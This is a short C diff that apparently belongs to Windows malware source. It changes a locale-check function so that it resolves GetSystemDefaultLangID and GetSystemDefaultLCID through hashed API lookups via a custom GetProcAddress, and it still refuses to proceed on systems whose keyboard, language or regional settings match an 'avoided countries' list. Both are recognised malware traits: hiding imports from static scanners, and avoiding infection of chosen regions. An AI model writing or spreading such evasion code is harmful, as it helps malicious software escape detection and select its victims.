@@ -132,11 +132,13 @@ bool is_valid_hostname(const char* hostname) {
 }
 
 
+bool is_valid_language(HMODULE hKernel32) {
+    GetSystemDefaultLangIDFunc pGetSystemDefaultLangID = (GetSystemDefaultLangIDFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_DEFAULT_LANGID_HASH);
+    GetSystemDefaultLCIDFunc pGetSystemDefaultLCID = (GetSystemDefaultLCIDFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_DEFAULT_LCID_HASH);
 
-bool is_valid_language() {
     uint16_t id_keyboard = LOWORD(GetKeyboardLayout(0));   // Keyboard layout
-    uint16_t id_system = GetSystemDefaultLangID();         // System language
-    uint16_t id_regional = LOWORD(GetSystemDefaultLCID()); // System regional settings
+    uint16_t id_system = pGetSystemDefaultLangID();         // System language
+    uint16_t id_regional = LOWORD(pGetSystemDefaultLCID()); // System regional settings
     for (size_t i = 0; i < AVOIDED_COUNTRIES_SIZE; i++) {
         if (AVOIDED_COUNTRIES[i] == id_keyboard || AVOIDED_COUNTRIES[i] == id_system || AVOIDED_COUNTRIES[i] == id_regional) {
             return false;
